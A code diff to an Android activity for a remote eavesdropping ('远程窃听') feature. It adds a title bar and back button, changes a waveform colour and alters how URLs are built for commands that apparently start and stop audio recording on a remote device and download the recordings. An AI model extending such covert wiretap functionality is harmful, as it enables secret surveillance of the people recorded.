@@ -20,6 +20,7 @@ import android.support.v4.content.ContextCompat;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
+import android.widget.RelativeLayout;
 import android.widget.TextView;
 
 import com.alibaba.fastjson.asm.Label;
@@ -140,6 +141,7 @@ public class WiretapActivity extends BaseActivity implements ServiceConnection{
                     mediaPlayer.start();
                     recordStatus = RecordStatus.RecordStatus_Play;
                 }catch (Exception e){
+
                     e.printStackTrace();
                 }
             }
@@ -180,6 +182,16 @@ public class WiretapActivity extends BaseActivity implements ServiceConnection{
 
     public void initView(){
 
+        View titleView = findViewById(R.id.ll_button) ;
+        TextView titleTextView = (TextView)titleView.findViewById(R.id.tv_title);
+        titleTextView.setText("远程窃听");
+        RelativeLayout btn_back = (RelativeLayout)titleView.findViewById(R.id.btn_back);
+        btn_back.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                WiretapActivity.this.finish();
+            }
+        });
         btnPlay = (Button) findViewById(R.id.btn_play);
         btnStop = (Button) findViewById(R.id.btn_stop);
         titleLabel = (TextView) findViewById(R.id.txt_title);
@@ -192,7 +204,7 @@ public class WiretapActivity extends BaseActivity implements ServiceConnection{
             public void onClick(View v) {
                 if (recordStatus == RecordStatus.RecordStatus_Start){
                     if (httpService != null){
-                        String url = SettingManager.getInstance().getHttpHost() +":"+ SettingManager.getInstance().getHttpPort() + "/v1/device";
+                        String url = SettingManager.getInstance().getHttpHost()+ SettingManager.getInstance().getHttpPort() + "/v1/device";
                         try {
                             JSONObject cmd = new JSONObject();
                             cmd.put("c",8);
@@ -232,13 +244,13 @@ public class WiretapActivity extends BaseActivity implements ServiceConnection{
         mediaPlayer = new MediaPlayer();
         RendererFactory rendererFactory = new RendererFactory();
         mWvWaveform = (WaveformView)findViewById(R.id.wiretap_wv_waveform);
-        mWvWaveform.setRenderer(rendererFactory.createSimpleWaveformRender(ContextCompat.getColor(this, R.color.red), Color.WHITE));
+        mWvWaveform.setRenderer(rendererFactory.createSimpleWaveformRender(ContextCompat.getColor(this, R.color.red), ContextCompat.getColor(this,R.color.appgray)));
 
         initAPKDir();
     }
 
     public void stopWiretap(){
-        String url = SettingManager.getInstance().getHttpHost()+":"+SettingManager.getInstance().getHttpPort()+"/v1/device";
+        String url = SettingManager.getInstance().getHttpHost()+SettingManager.getInstance().getHttpPort()+"/v1/device";
         try {
             JSONObject cmd = new JSONObject();
             cmd.put("c",9);
@@ -253,7 +265,7 @@ public class WiretapActivity extends BaseActivity implements ServiceConnection{
 
     public void downLoadFile(final String fileName){
         String file = fileName.split("\\.")[0];
-        String url = SettingManager.getInstance().getHttpHost()+":"+SettingManager.getInstance().getHttpPort()+"/v1/record?name=" +file;
+        String url = SettingManager.getInstance().getHttpHost()+SettingManager.getInstance().getHttpPort()+"/v1/record?name=" +file;
         HttpHandler<File> httpHandler = new HttpUtils().download(HttpRequest.HttpMethod.GET,url, APK_dir + fileName, null, new RequestCallBack<File>() {
             @Override
             public void onSuccess(ResponseInfo<File> responseInfo) {
